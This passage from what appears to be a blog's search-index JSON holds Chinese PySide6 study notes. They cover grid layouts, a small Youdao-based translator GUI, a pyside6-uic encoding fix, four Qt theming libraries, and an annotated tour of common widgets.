class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):  <span class=\"hljs-comment\"># 创建一个类</span><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br><br>        self.mainLayout = QVBoxLayout()   <span class=\"hljs-comment\"># 这个可以注释也可以不注释,如果注释下面的也注释,setLayout的时候也要设置成这个layout</span><br><br>        self.gridLayout = QGridLayout()<br>        self.gridLayout.addWidget(QPushButton(<span class=\"hljs-string\">&#x27;0&#x27;</span>), <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>)<br>        self.gridLayout.addWidget(QPushButton(<span class=\"hljs-string\">&#x27;1&#x27;</span>), <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">1</span>)<br>        self.gridLayout.addWidget(QPushButton(<span class=\"hljs-string\">&#x27;2&#x27;</span>), <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">2</span>)<br>        self.gridLayout.addWidget(QPushButton(<span class=\"hljs-string\">&#x27;3&#x27;</span>), <span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">0</span>)<br>        self.gridLayout.addWidget(QPushButton(<span class=\"hljs-string\">&#x27;4&#x27;</span>), <span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">1</span>)<br>        self.gridLayout.addWidget(QPushButton(<span class=\"hljs-string\">&#x27;5&#x27;</span>), <span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">2</span>)<br>        self.gridLayout.addWidget(QPushButton(<span class=\"hljs-string\">&#x27;6&#x27;</span>), <span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">0</span>)<br>        self.gridLayout.addWidget(QPushButton(<span class=\"hljs-string\">&#x27;7&#x27;</span>), <span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">1</span>)<br>        self.gridLayout.addWidget(QPushButton(<span class=\"hljs-string\">&#x27;8&#x27;</span>), <span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">2</span>)<br>        self.gridLayout.addWidget(QPushButton(<span class=\"hljs-string\">&#x27;9&#x27;</span>), <span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">3</span>)<br><br>        self.mainLayout.addLayout(self.gridLayout)  <span class=\"hljs-comment\"># 这个可以注释也可以不注释</span><br>        self.setLayout(self.gridLayout)<br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:  <span class=\"hljs-comment\"># 入口函数</span><br>    app = QApplication([])  <span class=\"hljs-comment\"># 创建一个对象</span><br>    window = MyWindow()  <span class=\"hljs-comment\"># 再创建一个对象</span><br>    window.show()  <span class=\"hljs-comment\"># 执行类的方法</span><br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n\n","categories":["PySide6"],"tags":["python"]},{"title":"PySide6学习笔记#7","url":"/2023/04/28/PySide6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-7/","content":"<p>今天做一个简单的翻译器</p>\n<span id=\"more\"></span>\n\n<h1 id=\"画Gui界面\"><a href=\"#画Gui界面\" class=\"headerlink\" title=\"画Gui界面\"></a>画Gui界面</h1>\n\n<p>简洁× 不会√</p>\n<h2 id=\"遇到的坑\"><a href=\"#遇到的坑\" class=\"headerlink\" title=\"遇到的坑\"></a>遇到的坑</h2><p>没想到这么简单的都可以遇到坑啊</p>\n<p>在将ui文件转换为py文件的时候，</p>\n<p>我的cmd命令是这样的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">pyside6-uic ui.ui &gt; ui.py<br></code></pre></td></tr></table></figure>\n\n<p>执行后输出了一个py文件，</p>\n<p>听到这里，可能你还没有发现问题，</p>\n<p>但是在我setup_Ui的时候，</p>\n<p>报错：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">ValueError: source code string cannot contain null bytes<br></code></pre></td></tr></table></figure>\n\n<p>一开始以为是我的这个中文导致了乱码，</p>\n<p>在改为英文之后，</p>\n<p>依旧还是报这个错，</p>\n<p>冷静思考一番后，知道了问题所在：</p>\n<p>cmd或者Powershell默认使用的gbk编码，</p>\n<p>但是python读取的时候是utf-8编码！</p>\n<p>pyside6-uic内置的参数（-o）使用的就是utf-8，</p>\n<p>因此之前都没有问题，</p>\n<p>将编译命令改为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">pyside6-uic untitled.ui -o ui.py<br></code></pre></td></tr></table></figure>\n\n<p>即可</p>\n<p>好了现在可以安心写代码了</p>\n<h1 id=\"框架预设\"><a href=\"#框架预设\" class=\"headerlink\" title=\"框架预设\"></a>框架预设</h1><p>和之前那个一样，</p>\n<p>但是可以添加了一个radio button，</p>\n<p>是否添加数据到data.txt，</p>\n<p>方便记录</p>\n<h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget<br><span class=\"hljs-keyword\">from</span> ui <span class=\"hljs-keyword\">import</span> Ui_Form<br><span class=\"hljs-keyword\">import</span> requests<br><br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(QWidget, Ui_Form):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        self.setupUi(self)<br>        self.pushButton.clicked.connect(<span class=\"hljs-keyword\">lambda</span>: self.bind(self.textEdit.toPlainText()))<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">get</span>(<span class=\"hljs-params\">self, url</span>):<br>        headers = &#123;<br>            <span class=\"hljs-string\">&#x27;user-agent&#x27;</span>: <span class=\"hljs-string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.62&#x27;</span>&#125;<br>        content = requests.get(url, headers=headers).text<br>        <span class=\"hljs-keyword\">return</span> content<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">write</span>(<span class=\"hljs-params\">self, content</span>):<br>        <span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">&#x27;data.txt&#x27;</span>, <span class=\"hljs-string\">&#x27;a&#x27;</span>, encoding=<span class=\"hljs-string\">&#x27;utf-8&#x27;</span>) <span class=\"hljs-keyword\">as</span> f:<br>            f.write(content + <span class=\"hljs-string\">&#x27;\\n&#x27;</span>)<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">bind</span>(<span class=\"hljs-params\">self, current_text</span>):<br>        word = current_text.replace(<span class=\"hljs-string\">&#x27;\\n&#x27;</span>, <span class=\"hljs-string\">&#x27;&#x27;</span>)<br>        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(word) &lt;= <span class=\"hljs-number\">30</span>:<br>            res = self.get(<span class=\"hljs-string\">f&#x27;http://fanyi.youdao.com/translate?&amp;doctype=json&amp;type=AUTO&amp;i=<span class=\"hljs-subst\">&#123;word&#125;</span>&#x27;</span>)<br>            translate = res.split(<span class=\"hljs-string\">&#x27;[[&#123;&quot;src&quot;:&quot;&#x27;</span>)[<span class=\"hljs-number\">1</span>].split(<span class=\"hljs-string\">&#x27;&quot;,&quot;tgt&quot;:&quot;&#x27;</span>)[<span class=\"hljs-number\">1</span>].split(<span class=\"hljs-string\">&#x27;&quot;&#125;]]&#125;&#x27;</span>)[<span class=\"hljs-number\">0</span>].replace(<span class=\"hljs-string\">&#x27;\\n&#x27;</span>, <span class=\"hljs-string\">&#x27;&#x27;</span>)<br>            self.textEdit_2.setText(translate)<br>            self.write(<span class=\"hljs-string\">f&#x27;<span class=\"hljs-subst\">&#123;word&#125;</span>^^^<span class=\"hljs-subst\">&#123;translate&#125;</span>&#x27;</span>)<br>        <span class=\"hljs-keyword\">else</span>:<br>            self.get(<span class=\"hljs-string\">f&#x27;http://fanyi.youdao.com/translate?&amp;doctype=json&amp;type=AUTO&amp;i=<span class=\"hljs-subst\">&#123;word&#125;</span>&#x27;</span>)<br>            translate = self.res.split(<span class=\"hljs-string\">&#x27;[[&#123;&quot;src&quot;:&quot;&#x27;</span>)[<span class=\"hljs-number\">1</span>].split(<span class=\"hljs-string\">&#x27;&quot;,&quot;tgt&quot;:&quot;&#x27;</span>)[<span class=\"hljs-number\">1</span>].split(<span class=\"hljs-string\">&#x27;&quot;&#125;]]&#125;&#x27;</span>)[<span class=\"hljs-number\">0</span>].replace(<span class=\"hljs-string\">&#x27;\\n&#x27;</span>, <span class=\"hljs-string\">&#x27;&#x27;</span>)<br>            self.textEdit_2.setText(translate)<br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>如果单词长度大于30就不加入data.txt中了，</p>\n<p>因为长度大于30的肯定是句子，</p>\n<p>test的时候不会想要翻译句子的</p>\n<h2 id=\"遇到的问题\"><a href=\"#遇到的问题\" class=\"headerlink\" title=\"遇到的问题\"></a>遇到的问题</h2><p>这个问题相对来说比较少</p>\n<p>就一个：</p>\n<p>text edit这个获取当前文本是textEdit.toPlainText()</p>\n<p>而不是current开头的</p>\n","categories":["PySide6"],"tags":["python"]},{"title":"PySide6学习笔记#9-1","url":"/2023/04/30/PySide6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-9-1/","content":"<p>在课程大纲里面看到了一节课是关于界面美化的，</p>\n<p>很有意思，直接提前发出来吧，算是个小扩展</p>\n<span id=\"more\"></span>\n\n<h1 id=\"1-QtMaterial\"><a href=\"#1-QtMaterial\" class=\"headerlink\" title=\"1 QtMaterial\"></a>1 QtMaterial</h1><p>项目地址：</p>\n<p><a href=\"https://github.com/UN-GCPDS/qt-material\">这里</a></p>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">pip install qt_material<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"使用方法\"><a href=\"#使用方法\" class=\"headerlink\" title=\"使用方法\"></a>使用方法</h2><p>然后在你的文件的最前面import这个库</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> qt_material <span class=\"hljs-keyword\">import</span> apply_stylesheet<br></code></pre></td></tr></table></figure>\n\n<p>然后在最后加上第三行那一句就可以啦</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    apply_stylesheet(app, theme=<span class=\"hljs-string\">&#x27;light_cyan_500.xml&#x27;</span>)<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>里面的theme有很多</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">[&#x27;dark_amber.xml&#x27;,<br> &#x27;dark_blue.xml&#x27;,<br> &#x27;dark_cyan.xml&#x27;,<br> &#x27;dark_lightgreen.xml&#x27;,<br> &#x27;dark_pink.xml&#x27;,<br> &#x27;dark_purple.xml&#x27;,<br> &#x27;dark_red.xml&#x27;,<br> &#x27;dark_teal.xml&#x27;,<br> &#x27;dark_yellow.xml&#x27;,<br> &#x27;light_amber.xml&#x27;,<br> &#x27;light_blue.xml&#x27;,<br> &#x27;light_cyan.xml&#x27;,<br> &#x27;light_cyan_500.xml&#x27;,<br> &#x27;light_lightgreen.xml&#x27;,<br> &#x27;light_pink.xml&#x27;,<br> &#x27;light_purple.xml&#x27;,<br> &#x27;light_red.xml&#x27;,<br> &#x27;light_teal.xml&#x27;,<br> &#x27;light_yellow.xml&#x27;]<br></code></pre></td></tr></table></figure>\n\n<p>每一个都挺漂亮</p>\n<p>这个库唯一美中不足的就是设置的字体以及字体大小会掉</p>\n<p>原来的：</p>\n\n\n<p>现在的</p>\n\n\n<p>没关系无伤大雅！</p>\n<h1 id=\"2-QtModern\"><a href=\"#2-QtModern\" class=\"headerlink\" title=\"2 QtModern\"></a>2 QtModern</h1><p><a href=\"https://github.com/gmarull/qtmodern\">项目地址</a></p>\n<h2 id=\"安装-1\"><a href=\"#安装-1\" class=\"headerlink\" title=\"安装\"></a>安装</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">pip install qtmodern<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"使用方法-1\"><a href=\"#使用方法-1\" class=\"headerlink\" title=\"使用方法\"></a>使用方法</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> qtmodern.styles<br><span class=\"hljs-keyword\">import</span> qtmodern.windows<br><br><span class=\"hljs-comment\"># ...</span><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    qtmodern.styles.dark(app)<br>    mw = qtmodern.windows.ModernWindow(MyWindow())<br>    mw.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br><br><span class=\"hljs-comment\"># ...</span><br></code></pre></td></tr></table></figure>\n\n<p>泰裤辣！</p>\n<p>这里出了点小插曲，</p>\n<p>但是最后还是搞好了🤭</p>\n\n\n<p>这个似乎就是Mac风格的，</p>\n<p>windows上弹了一个像Mac一样的窗口哈哈哈哈</p>\n<p>这个字体和字体大小都没有问题，</p>\n<p>和前面的那个相比就是风格只有light和dark两个</p>\n<p>（够用了</p>\n<h1 id=\"3-QDarkStyleSheet\"><a href=\"#3-QDarkStyleSheet\" class=\"headerlink\" title=\"3 QDarkStyleSheet\"></a>3 QDarkStyleSheet</h1><p><a href=\"https://github.com/ColinDuquesnoy/QDarkStyleSheet\">项目地址</a></p>\n<h2 id=\"安装-2\"><a href=\"#安装-2\" class=\"headerlink\" title=\"安装\"></a>安装</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">pip install qdarkstyle<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"使用方法-2\"><a href=\"#使用方法-2\" class=\"headerlink\" title=\"使用方法\"></a>使用方法</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> qdarkstyle<br><br><span class=\"hljs-comment\"># ....</span><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    app.setStyleSheet(qdarkstyle.load_stylesheet(qt_api=<span class=\"hljs-string\">&#x27;pyside6&#x27;</span>))<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n\n\n<p>这个字体没有变，</p>\n<p>但是字好像被吞了一部分</p>\n<p>然后在运行的时候报了个错，</p>\n<p>但是没有影响程序正常运行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">D:\\Home\\python\\lib\\site-packages\\qtpy\\__init__.py:267: PythonQtWarning: Selected binding &#x27;pyqt5&#x27; could not be found; falling back to &#x27;pyside6&#x27;<br>  warnings.warn(<br></code></pre></td></tr></table></figure>\n\n<p>可以在cmd里面执行下面的命令看看示例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">qdarkstyle.example --palette=light<br><br>qdarkstyle.example --palette=dark<br></code></pre></td></tr></table></figure>\n\n\n\n<p>牛皮</p>\n<p>（白的那个不好看我觉得有点像早期iPhone的ui</p>\n<h1 id=\"PyQtDarkTheme\"><a href=\"#PyQtDarkTheme\" class=\"headerlink\" title=\"PyQtDarkTheme\"></a>PyQtDarkTheme</h1><p><a href=\"https://github.com/5yutan5/PyQtDarkTheme\">项目地址</a></p>\n<h2 id=\"安装-3\"><a href=\"#安装-3\" class=\"headerlink\" title=\"安装\"></a>安装</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">pip install pyqtdarktheme<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"使用方法-3\"><a href=\"#使用方法-3\" class=\"headerlink\" title=\"使用方法\"></a>使用方法</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> qdarktheme<br><br><br><span class=\"hljs-comment\"># ...</span><br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    qdarktheme.setup_theme()  <span class=\"hljs-comment\"># 可以在这里设置light</span><br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>默认的是dark，</p>\n<p>可以设置light和auto</p>\n\n\n<p>他甚至可以设置是否圆角</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\">qdarktheme.setup_theme(corner_shape=<span class=\"hljs-string\">&quot;sharp&quot;</span>)<br></code></pre></td></tr></table></figure>\n\n<p>查看全部组件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">python -m qdarktheme.widget_gallery，<br></code></pre></td></tr></table></figure>\n","categories":["PySide6"],"tags":["python"]},{"title":"PySide6学习笔记#9","url":"/2023/04/30/PySide6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-9/","content":"<p>今天是常用控件的总结</p>\n<span id=\"more\"></span>\n\n<h1 id=\"知识点\"><a href=\"#知识点\" class=\"headerlink\" title=\"知识点\"></a>知识点</h1><ul>\n<li>给组件设置属性的时候有时候用的是QtCore，有时候是在当前组件的中</li>\n</ul>\n<p>如何具体辨别呢？</p>\n<p>我发现的规律就是QtCore里面的东西对应的都是QtDesigner里面蓝色框里面的</p>\n\n\n<p>其他的都是用当前组件中自带的类中的方法设置，比如</p>\n<p>QLineEdit.EchoMode.Password  这个属性</p>\n<ul>\n<li>查找信号去Zeal里面查</li>\n</ul>\n<p>或者，可以去qt助手里面查，具体的前面我发了文章的<a href=\"https://www.handsome-vincent.space/2023/04/26/PyQt%E5%8A%A9%E6%89%8B%E4%B8%8B%E8%BD%BD/\">PyQt助手下载</a></p>\n<p>Zeal下载地址：<a href=\"https://zealdocs.org/download.html\">Download · Zeal</a></p>\n<ul>\n<li>一个控件可以绑定多个信号（这不用说都知道</li>\n</ul>\n<h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> (<br>    QApplication, QWidget, QVBoxLayout, QPushButton, QLabel,<br>    QLineEdit, QComboBox, QCheckBox, QRadioButton, QButtonGroup,<br>    QHBoxLayout, QFormLayout, QGridLayout, QTextEdit, QPlainTextEdit,<br>    QSlider<br>                               )<br><span class=\"hljs-keyword\">from</span> PySide6.QtCore <span class=\"hljs-keyword\">import</span> Qt<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        self.mainLayout = QVBoxLayout()<br><br>        <span class=\"hljs-comment\"># Label</span><br>        self.label = QLabel(<span class=\"hljs-string\">&#x27;Label&#x27;</span>)<br>        self.label.setToolTip(<span class=\"hljs-string\">&#x27;ToolTip&#x27;</span>)<br>        self.mainLayout.addWidget(self.label)<br><br>        <span class=\"hljs-comment\"># PushButton</span><br>        self.btn = QPushButton(<span class=\"hljs-string\">&#x27;PushButton&#x27;</span>)<br>        self.btn.clicked.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;Clicked the pushbutton!&#x27;</span>))<br>        self.mainLayout.addWidget(self.btn)<br><br>        <span class=\"hljs-comment\"># LineEdit</span><br>        self.line = QLineEdit()<br>        self.line.setPlaceholderText(<span class=\"hljs-string\">&#x27;Place holder&#x27;</span>)<br>        self.line.setEchoMode(QLineEdit.EchoMode.Password)<br>        self.mainLayout.addWidget(self.line)<br><br>        <span class=\"hljs-comment\"># ComboBox</span><br>        self.combobox = QComboBox()<br>        self.combobox.addItems([<span class=\"hljs-string\">&#x27;小可爱&#x27;</span>, <span class=\"hljs-string\">&#x27;大聪明&#x27;</span>, <span class=\"hljs-string\">&#x27;小天才&#x27;</span>])<br>        self.combobox.setEditable(<span class=\"hljs-literal\">True</span>)<br>        self.combobox.setCursor(Qt.CursorShape.WaitCursor)   <span class=\"hljs-comment\"># 设置鼠标状态</span><br>        self.combobox.currentTextChanged.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(self.combobox.currentText()))<br>        self.mainLayout.addWidget(self.combobox)<br><br>        <span class=\"hljs-comment\"># CheckBox</span><br>        self.checkbox = QCheckBox(<span class=\"hljs-string\">&#x27;A live person&#x27;</span>)<br>        self.checkbox.setChecked(<span class=\"hljs-literal\">True</span>)<br>        <span class=\"hljs-comment\"># self.checkbox.setEnabled(False)   # 是否可操作</span><br>        self.mainLayout.addWidget(self.checkbox)<br>        self.checkbox.setCheckState(Qt.PartiallyChecked)   <span class=\"hljs-comment\"># 三态复选框(拓展)</span><br><br>        <span class=\"hljs-comment\"># RadioButton &amp; QHBoxLayout</span><br>        self.layout_1 = QHBoxLayout()<br>        self.radio_btn1 = QRadioButton(<span class=\"hljs-string\">&#x27;RadioButton1&#x27;</span>)<br>        self.radio_btn1.clicked.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;RadioButton1: &#x27;</span>+<span class=\"hljs-built_in\">str</span>(self.radio_btn1.isChecked())))<br>        self.radio_btn2 = QRadioButton(<span class=\"hljs-string\">&#x27;RadioButton2&#x27;</span>)<br>        self.radio_btn2.setChecked(<span class=\"hljs-literal\">True</span>)<br>        self.layout_1.addWidget(self.radio_btn1)<br>        self.layout_1.addWidget(self.radio_btn2)<br>        self.mainLayout.addLayout(self.layout_1)<br><br>        <span class=\"hljs-comment\"># ButtonGroup &amp; QFormLayout</span><br>        self.layout_2 = QFormLayout()<br>        self.btn_group = QButtonGroup()<br>        self.radio_btn3 = QRadioButton(<span class=\"hljs-string\">&#x27;RadioButton3&#x27;</span>)<br>        self.radio_btn4 = QRadioButton(<span class=\"hljs-string\">&#x27;RadioButton4&#x27;</span>)<br>        self.layout_2.addRow(self.radio_btn3)<br>        self.layout_2.addRow(self.radio_btn4)<br>        self.mainLayout.addLayout(self.layout_2)<br>        self.btn_group.addButton(self.radio_btn3)<br>        self.btn_group.addButton(self.radio_btn4)<br>        self.btn_group.buttonClicked.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(self.btn_group.checkedButton().text()))<br><br>        <span class=\"hljs-comment\"># TextEdit &amp; PlainTextEdit &amp; QGridLayout</span><br>        self.layout_3 = QGridLayout()<br>        self.layout_3.addWidget(QTextEdit(), <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>)<br>        self.layout_3.addWidget(QPlainTextEdit(), <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">1</span>)<br>        self.mainLayout.addLayout(self.layout_3)<br><br>        <span class=\"hljs-comment\"># QSlider</span><br>        self.slider = QSlider()<br>        self.slider.setOrientation(Qt.Orientation.Horizontal)<br>        self.slider.setTickInterval(<span class=\"hljs-number\">10</span>)<br>        self.slider.setTickPosition(QSlider.TickPosition.TicksBelow)<br>        self.slider.valueChanged.connect(<span class=\"hljs-keyword\">lambda</span>: self.label.setText(<span class=\"hljs-built_in\">str</span>(self.slider.value())))<br><br>        self.mainLayout.addWidget(self.slider)<br><br>        self.setLayout(self.mainLayout)<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>我在up的基础上还加上了布局的复习</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">这是一个使用PyQt5创建图形用户界面的代码片段。下面是每一段代码的详细解释：<br><br>self.label = QLabel(&#x27;Label&#x27;)：创建一个标签（QLabel）并将其文本设置为“Label”。<br><br>self.label.setToolTip(&#x27;ToolTip&#x27;)：为标签设置工具提示，当鼠标悬停在标签上时，将显示“ToolTip”。<br><br>self.mainLayout.addWidget(self.label)：将标签添加到主布局中。<br><br>self.btn = QPushButton(&#x27;PushButton&#x27;)：创建一个按钮（QPushButton）并将其文本设置为“PushButton”。<br><br>self.btn.clicked.connect(lambda: print(&#x27;Clicked the pushbutton!&#x27;))：当按钮被点击时，连接一个槽函数，打印“Clicked the pushbutton!”。<br><br>self.mainLayout.addWidget(self.btn)：将按钮添加到主布局中。<br><br>self.line = QLineEdit()：创建一个单行文本输入框（QLineEdit）。<br><br>self.line.setPlaceholderText(&#x27;Place holder&#x27;)：为单行文本输入框设置占位符文本，当输入框为空时，将显示“Place holder”。<br><br>self.line.setEchoMode(QLineEdit.EchoMode.Password)：设置单行文本输入框的回显模式为密码模式，即输入的字符将以圆点显示。<br><br>self.mainLayout.addWidget(self.line)：将单行文本输入框添加到主布局中。<br><br>self.combobox = QComboBox()：创建一个组合框（QComboBox）。<br><br>self.combobox.addItems([&#x27;小可爱&#x27;, &#x27;大聪明&#x27;, &#x27;小天才&#x27;])：向组合框中添加项目，项目为“小可爱”，“大聪明”和“小天才”。<br><br>self.combobox.setEditable(True)：设置组合框为可编辑状态，即用户可以在组合框中输入文本。<br><br>self.combobox.setCursor(Qt.CursorShape.WaitCursor)：设置鼠标状态为等待状态（WaitCursor）。<br><br>self.combobox.currentTextChanged.connect(lambda: print(self.combobox.currentText()))：当组合框中当前选定的文本发生更改时，连接一个槽函数，打印当前选定的文本。<br><br>self.mainLayout.addWidget(self.combobox)：将组合框添加到主布局中。<br><br>self.checkbox = QCheckBox(&#x27;A live person&#x27;)：创建一个复选框（QCheckBox）并将其文本设置为“A live person”。<br><br>self.checkbox.setChecked(True)：设置复选框为选中状态。<br><br># self.checkbox.setEnabled(False)：注释掉的代码表示设置复选框为不可操作状态。<br><br>self.mainLayout.addWidget(self.checkbox)：将复选框添加到主布局中。<br><br>self.checkbox.setCheckState(Qt.PartiallyChecked)：设置复选框的检查状态为部分选中状态（PartiallyChecked），这是三态复选框的拓展功能。<br><br>self.layout_1 = QHBoxLayout()：创建一个水平布局（QHBoxLayout）。<br><br>self.radio_btn1 = QRadioButton(&#x27;RadioButton1&#x27;)：创建一个单选按钮（QRadioButton）并将其文本设置为“RadioButton1”。<br><br>self.radio_btn1.clicked.connect(lambda: print(&#x27;RadioButton1: &#x27;+str(self.radio_btn1.isChecked())))：当单选按钮被点击时，连接一个槽函数，打印“RadioButton1: ”和单选按钮的检查状态（isChecked()返回True或False）。<br><br>self.radio_btn2 = QRadioButton(&#x27;RadioButton2&#x27;)：创建另一个单选按钮并将其文本设置为“RadioButton2”。<br><br>self.radio_btn2.setChecked(True)：设置单选按钮2为选中状态。<br><br>self.layout_1.addWidget(self.radio_btn1)和self.layout_1.addWidget(self.radio_btn2)：将两个单选按钮添加到水平布局中。<br>self.layout_2 = QFormLayout()：创建一个表单布局（QFormLayout）。<br><br>self.btn_group = QButtonGroup()：创建一个按钮组（QButtonGroup）。<br><br>self.radio_btn3 = QRadioButton(&#x27;RadioButton3&#x27;)和self.radio_btn4 = QRadioButton(&#x27;RadioButton4&#x27;)：创建两个单选按钮（QRadioButton），并将它们的文本分别设置为“RadioButton3”和“RadioButton4”。<br><br>self.layout_2.addRow(self.radio_btn3)和self.layout_2.addRow(self.radio_btn4)：将两个单选按钮添加到表单布局中，每个单选按钮占一行。<br><br>self.mainLayout.addLayout(self.layout_2)：将表单布局添加到主布局中。<br><br>self.btn_group.addButton(self.radio_btn3)和self.btn_group.addButton(self.radio_btn4)：将两个单选按钮添加到按钮组中。<br><br>self.btn_group.buttonClicked.connect(lambda: print(self.btn_group.checkedButton().text()))：当按钮组中的任意一个按钮被点击时，连接一个槽函数，打印按钮组中当前选中的按钮的文本。<br><br>self.layout_3 = QGridLayout()：创建一个网格布局（QGridLayout）。<br><br>self.layout_3.addWidget(QTextEdit(), 0, 0)和self.layout_3.addWidget(QPlainTextEdit(), 0, 